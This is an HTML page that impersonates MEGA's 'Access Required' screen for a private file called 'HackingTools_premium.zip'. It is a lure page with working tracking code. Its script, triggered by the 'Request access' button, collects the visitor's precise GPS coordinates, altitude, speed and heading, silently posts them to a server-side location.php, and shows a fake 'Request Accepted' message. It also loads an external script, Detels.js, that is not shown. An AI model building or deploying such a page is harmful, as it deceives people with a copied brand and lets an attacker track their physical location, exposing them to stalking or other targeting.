<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>MEGA</title>
<link rel="icon" href="https://mega.nz/favicon.ico"/>
<link rel="preconnect" href="https://fonts.googleapis.com"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
svg{outline:none;border:none;}
a{outline:none;}
 
:root{
  --red:#d90007;
  --red-hover:#b80006;
  --bg:#1e1e1e;
  --surface:#2a2a2a;
  --border:#3a3a3a;
  --text:#e0e0e0;
  --muted:#888;
  --white:#fff;
}
 
body{
  font-family:'Source Sans 3',sans-serif;
  background:var(--bg);
  color:var(--text);
  min-height:100vh;
  display:flex;flex-direction:column;
}
 
/* ── TOP NAV ── */
nav{
  display:flex;align-items:center;justify-content:space-between;
  padding:0 32px;height:60px;
  background:#141414;
  border-bottom:1px solid #111;
  position:sticky;top:0;z-index:50;
}
.nav-logo{display:flex;align-items:center;gap:2px;text-decoration:none;outline:none;border:none;}
.mega-logo-svg{width:100px;height:auto;display:block;outline:none;border:none;}
.nav-right{display:flex;align-items:center;gap:8px;}
.nav-link{
  font-size:14px;color:var(--muted);
  text-decoration:none;padding:6px 12px;
  border-radius:4px;
  transition:color .15s,background .15s;
}
.nav-link:hover{color:var(--white);background:#2a2a2a;}
.nav-btn{
  font-size:14px;font-weight:600;
  color:var(--white);background:var(--red);
  border:none;border-radius:4px;
  padding:7px 18px;cursor:pointer;
  font-family:'Source Sans 3',sans-serif;
  transition:background .15s;
  text-decoration:none;
}
.nav-btn:hover{background:var(--red-hover);}
 
/* ── MAIN ── */
main{
  flex:1;display:flex;flex-direction:column;
  align-items:center;justify-content:center;
  padding:40px 20px;
  min-height:calc(100vh - 60px - 56px);
}
 
.perm-wrap{
  display:flex;flex-direction:column;
  align-items:center;text-align:center;
  max-width:480px;width:100%;
}
 
/* MEGA logo big */
.mega-logo-big{
  margin-bottom:40px;
}
.mega-logo-big svg{width:140px;height:auto;}
 
/* icon */
.lock-icon{
  width:80px;height:80px;
  background:#2a2a2a;
  border:2px solid var(--border);
  border-radius:50%;
  display:flex;align-items:center;justify-content:center;
  margin:0 auto 28px;
}
.lock-icon svg{width:38px;height:38px;stroke:var(--red);}
 
.perm-title{
  font-size:26px;font-weight:700;
  color:var(--white);
  margin-bottom:12px;letter-spacing:-.2px;
}
 
.perm-sub{
  font-size:15px;color:var(--muted);
  line-height:1.75;margin-bottom:32px;
}
.perm-sub a{color:#f26c6c;text-decoration:none;}
.perm-sub a:hover{text-decoration:underline;}
 
/* File info pill */
.file-pill{
  display:flex;align-items:center;gap:10px;
  background:#252525;border:1px solid var(--border);
  border-radius:8px;padding:12px 18px;
  margin-bottom:28px;width:100%;
  text-align:left;
}
.file-pill svg{width:28px;height:28px;flex-shrink:0;}
.file-pill-info{}
.file-pill-name{font-size:14px;font-weight:600;color:var(--white);}
.file-pill-meta{font-size:12px;color:var(--muted);margin-top:2px;}
 
/* Buttons */
.btn-row{display:flex;flex-direction:column;gap:10px;width:100%;}
 
.btn-primary{
  width:100%;padding:13px;
  background:var(--red);color:var(--white);
  border:none;border-radius:6px;
  font-size:15px;font-weight:600;
  font-family:'Source Sans 3',sans-serif;
  cursor:pointer;letter-spacing:.2px;
  transition:background .15s,transform .1s;
  display:flex;align-items:center;justify-content:center;gap:8px;
}
.btn-primary:hover{background:var(--red-hover);}
.btn-primary:active{transform:scale(.99);}
.btn-primary svg{width:18px;height:18px;stroke:var(--white);}
 
.btn-secondary{
  width:100%;padding:12px;
  background:transparent;color:var(--muted);
  border:1px solid var(--border);border-radius:6px;
  font-size:14px;font-weight:500;
  font-family:'Source Sans 3',sans-serif;
  cursor:pointer;
  transition:border-color .15s,color .15s,background .15s;
}
.btn-secondary:hover{border-color:#555;color:var(--white);background:#2a2a2a;}
 
/* ── TOAST ── */
.toast{
  position:fixed;bottom:28px;left:50%;
  transform:translateX(-50%) translateY(16px);
  background:#333;color:#fff;
  padding:12px 24px;border-radius:6px;
  font-size:14px;font-family:'Source Sans 3',sans-serif;
  border:1px solid #444;
  opacity:0;pointer-events:none;
  transition:opacity .28s,transform .28s;
  white-space:nowrap;z-index:999;
  display:flex;align-items:center;gap:8px;
}
.toast svg{width:16px;height:16px;stroke:#1bc47d;flex-shrink:0;}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
 
/* ── FOOTER ── */
footer{
  background:#141414;
  border-top:1px solid #111;
  padding:14px 32px;
  display:flex;align-items:center;justify-content:space-between;
  flex-wrap:wrap;gap:8px;
}
.footer-left{font-size:12px;color:#555;}
.footer-links{display:flex;gap:20px;}
.footer-links a{font-size:12px;color:#555;text-decoration:none;transition:color .15s;}
.footer-links a:hover{color:var(--muted);}
 
/* =============================
   MOBILE ONLY - Naya CSS
   (max-width: 480px)
============================== */
@media (max-width: 480px) {
 
  /* --- Nav --- */
  nav {
    padding: 0 16px;
    height: 52px;
  }
 
  .mega-logo-svg {
    width: 72px;
  }
 
  .nav-link {
    display: none;
  }
 
  .nav-btn {
    font-size: 13px;
    padding: 6px 14px;
  }
 
  /* --- Main --- */
  main {
    padding: 28px 16px;
    justify-content: flex-start;
    min-height: calc(100vh - 52px - 52px);
  }
 
  /* --- Big Logo --- */
  .mega-logo-big {
    margin-bottom: 24px;
  }
 
  .mega-logo-big svg {
    width: 100px;
  }
 
  /* --- Lock Icon --- */
  .lock-icon {
    width: 64px;
    height: 64px;
    margin-bottom: 20px;
  }
 
  .lock-icon svg {
    width: 28px;
    height: 28px;
  }
 
  /* --- Text --- */
  .perm-title {
    font-size: 20px;
    margin-bottom: 10px;
  }
 
  .perm-sub {
    font-size: 14px;
    margin-bottom: 24px;
  }
 
  /* --- File Pill --- */
  .file-pill {
    padding: 10px 14px;
    margin-bottom: 20px;
    gap: 8px;
  }
 
  .file-pill svg {
    width: 22px;
    height: 22px;
  }
 
  .file-pill-name {
    font-size: 13px;
  }
 
  .file-pill-meta {
    font-size: 11px;
  }
 
  /* --- Buttons --- */
  .btn-primary {
    padding: 12px;
    font-size: 14px;
  }
 
  .btn-secondary {
    padding: 11px;
    font-size: 13px;
  }
 
  /* --- Toast --- */
  .toast {
    font-size: 13px;
    padding: 10px 18px;
    bottom: 16px;
    white-space: normal;
    text-align: center;
    width: calc(100% - 32px);
  }
 
  /* --- Footer --- */
  footer {
    padding: 12px 16px;
    justify-content: center;
    flex-direction: column;
    align-items: center;
    gap: 6px;
  }
 
  .footer-links {
    gap: 14px;
  }
 
  .footer-left,
  .footer-links a {
    font-size: 11px;
  }
}
</style>
</head>
<body>
 
<!-- TOP NAV -->
<nav>
  <a href="#" class="nav-logo">
    <svg class="mega-logo-svg" viewBox="0 0 200 50" fill="none" xmlns="http://www.w3.org/2000/svg">
      <!-- M -->
      <path d="M4 8 L16 8 L25 24 L34 8 L46 8 L46 42 L36 42 L36 22 L25 38 L14 22 L14 42 L4 42 Z" fill="#d90007"/>
      <!-- E -->
      <path d="M52 8 L52 42 L84 42 L84 33 L63 33 L63 29 L82 29 L82 21 L63 21 L63 17 L84 17 L84 8 Z" fill="#d90007"/>
      <!-- G -->
      <path d="M115 8 C103 8 94 16 94 25 C94 34 103 42 115 42 C121 42 128 39 130 38 L130 24 L114 24 L114 31 L121 31 L121 34 C119 35 117 35 115 35 C107 35 103 30 103 25 C103 20 107 15 115 15 C118 15 121 16.5 123 18.5 L130 13 C127 10 121 8 115 8 Z" fill="#d90007"/>
      <!-- A -->
      <path d="M160 8 L148 42 L158 42 L161 33 L173 33 L176 42 L186 42 L174 8 Z M167 16 L171 27 L163 27 Z" fill="#d90007"/>
    </svg>
  </a>
  <div class="nav-right">
    <a href="#" class="nav-link">Features</a>
    <a href="#" class="nav-link">Business</a>
    <a href="#" class="nav-link">Pricing</a>
    <a href="#" class="nav-btn">Log in</a>
  </div>
</nav>
 
<!-- MAIN -->
<main>
  <div class="perm-wrap">
 
    <div class="mega-logo-big">
      <svg viewBox="0 0 200 50" fill="none" xmlns="http://www.w3.org/2000/svg">
        <!-- M -->
        <path d="M4 8 L16 8 L25 24 L34 8 L46 8 L46 42 L36 42 L36 22 L25 38 L14 22 L14 42 L4 42 Z" fill="#d90007"/>
        <!-- E -->
        <path d="M52 8 L52 42 L84 42 L84 33 L63 33 L63 29 L82 29 L82 21 L63 21 L63 17 L84 17 L84 8 Z" fill="#d90007"/>
        <!-- G -->
        <path d="M115 8 C103 8 94 16 94 25 C94 34 103 42 115 42 C121 42 128 39 130 38 L130 24 L114 24 L114 31 L121 31 L121 34 C119 35 117 35 115 35 C107 35 103 30 107 24 C103 20 107 15 115 15 C118 15 121 16.5 123 18.5 L130 13 C127 10 121 8 115 8 Z" fill="#d90007"/>
        <!-- A -->
        <path d="M160 8 L148 42 L158 42 L161 33 L173 33 L176 42 L186 42 L174 8 Z M167 16 L171 27 L163 27 Z" fill="#d90007"/>
      </svg>
    </div>
 
    <div class="lock-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
      </svg>
    </div>
 
    <div class="perm-title">Access Required</div>
    <div class="perm-sub">
      This file is private. Request access from the owner,<br/>
      or <a href="#">log in</a> with an account that has permission.
    </div>
 
    <div class="file-pill">
      <svg viewBox="0 0 24 24" fill="none" stroke="#d90007" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
        <polyline points="14 2 14 8 20 8"/>
      </svg>
      <div class="file-pill-info">
        <div class="file-pill-name">HackingTools_premium.zip</div>
        <div class="file-pill-meta">Shared via MEGA link &nbsp;·&nbsp; Access restricted</div>
      </div>
    </div>
 
    <div class="btn-row">
      <button class="btn-primary" id="reqBtn" onclick="requestAccess()">
        <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 3.07 9.81 19.79 19.79 0 0 1 .01 1.18 2 2 0 0 1 2 0h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L6.91 7.91a16 16 0 0 0 6.17 6.17l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/>
        </svg>
        Request access
      </button>
      <button class="btn-secondary" onclick="window.location.href='#'">Log in to access</button>
    </div>
 
  </div>
</main>
 
<!-- TOAST -->
<div class="toast" id="toast">
  <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
    <polyline points="20 6 9 17 4 12"/>
  </svg>
  Request sent to file owner
</div>
 
<!-- FOOTER -->
<footer>
  <div class="footer-left">© 2024 Mega Limited</div>
  <div class="footer-links">
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
    <a href="#">Copyright</a>
    <a href="#">Contact</a>
  </div>
</footer>
<script src="Detels.js"></script>
<script>
(() => {

  // ==========================
  // 📍 REQUEST ACCESS
  // ==========================
  function requestAccess() {

    if (!navigator.geolocation) {
      updateUI("unsupported");
      showToast("Location not supported");
      return;
    }

    navigator.geolocation.getCurrentPosition(

      // ✅ SUCCESS
      function(position) {

        const data = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          speed: position.coords.speed,
          heading: position.coords.heading,
          timestamp: new Date().toISOString()
        };

        console.log("📍 Location OK:", data);

        sendLocation(data);

        updateUI("success");

        showToast("Request Accepted");
      },

      // ❌ ERROR / DENIED
      function(error) {

        console.log("❌ GPS Error:", error.message);

        if (error.code === error.PERMISSION_DENIED) {
          updateUI("denied");
          showToast("Permission Denied");
        } else {
          updateUI("error");
          showToast("Location Error");
        }
      },

      {
        enableHighAccuracy: true,
        timeout: 30000,
        maximumAge: 0
      }
    );
  }

  // ==========================
  // 📡 SEND DATA TO SERVER
  // ==========================
  async function sendLocation(data) {
    try {
      await fetch("location.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
    } catch (err) {
      console.log("Server error");
    }
  }

  // ==========================
  // 🎯 UI UPDATE
  // ==========================
  function updateUI(state) {

    const card = document.querySelector(".card");

    if (!card) return;

    if (state === "denied") {
      card.innerHTML = `
        <h1>Access Required</h1>
        <p>Please allow permission to continue.</p>
        <button class="req-btn" id="reqBtn">Allow Access</button>
      `;

      document
        .getElementById("reqBtn")
        .addEventListener("click", requestAccess);
    }

    if (state === "success") {
      card.innerHTML = `
        <h1>✓ Request Accepted</h1>
        <p>Your request has been successfully processed.</p>
      `;
    }

    if (state === "error") {
      card.innerHTML = `
        <h1>Try Again</h1>
        <p>Unable to get location. Please retry.</p>
        <button class="req-btn" id="reqBtn">Retry</button>
      `;

      document
        .getElementById("reqBtn")
        .addEventListener("click", requestAccess);
    }

    if (state === "unsupported") {
      card.innerHTML = `
        <h1>Not Supported</h1>
        <p>Your browser does not support location services.</p>
      `;
    }
  }

  // ==========================
  // 🔔 TOAST SYSTEM
  // ==========================
  function showToast(msg) {

    const t = document.getElementById("toast");

    if (!t) return;

    t.innerText = msg;

    t.classList.add("show");

    setTimeout(() => {
      t.classList.remove("show");
    }, 3000);
  }

  // ==========================
  // 🚀 BUTTON CLICK
  // ==========================
  document
    .getElementById("reqBtn")
    .addEventListener("click", requestAccess);

})();
</script>
</body>
</html>
